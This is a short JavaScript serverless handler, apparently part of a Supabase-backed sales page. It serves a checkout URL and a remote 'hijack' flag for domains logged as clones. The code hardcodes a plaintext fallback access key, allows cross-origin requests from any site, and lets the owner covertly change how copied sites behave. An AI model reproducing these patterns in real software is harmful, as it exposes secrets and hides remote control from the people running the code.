import { supabase } from './supabase.js';

export default async function handler(req, res) {
  // Configuração de CORS para permitir acesso de qualquer domínio (incluindo clones)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const { domain } = req.query;

  try {
    // 1. Busca a configuração mestra
    const { data: configData } = await supabase
      .from('apex_config')
      .select('value')
      .eq('key', 'main_config')
      .single();

    const config = configData?.value || {
      checkout_url: 'https://lastlink.com/p/CAA303628/checkout-payment/',
      access_key: 'apex_vip_access_2026_secure',
      official_domain: ''
    };

    // 2. Verifica se o domínio atual está em modo HIJACK
    let shouldHijack = false;
    if (domain && domain !== config.official_domain) {
      const { data: hijackData } = await supabase
        .from('apex_clones_log')
        .select('hijack_active')
        .eq('domain', domain)
        .eq('hijack_active', true)
        .maybeSingle();
      
      if (hijackData) shouldHijack = true;
    }

    return res.status(200).json({
      checkout_url: config.checkout_url,
      should_hijack: shouldHijack
    });

  } catch (err) {
    console.error('Config Error:', err);
    return res.status(500).json({ error: 'Erro ao carregar configuração' });
  }
}
